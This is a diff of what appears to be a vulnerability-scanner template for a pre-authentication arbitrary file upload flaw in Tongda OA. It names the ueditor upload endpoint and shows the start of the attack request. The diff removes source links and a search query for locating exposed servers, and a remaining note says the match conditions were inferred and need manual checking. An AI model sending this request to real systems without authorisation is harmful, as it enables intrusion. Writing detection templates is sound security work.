@@ -3,14 +3,8 @@ info:
   name: 通达OAaction存在前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8d5cafd4b143a54a4ca857321732b32e
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8d5cafd4b143a54a4ca857321732b32e
-    fofa: + hunter`app.name="通达 OA"`
 http:
 - raw:
   - 'POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
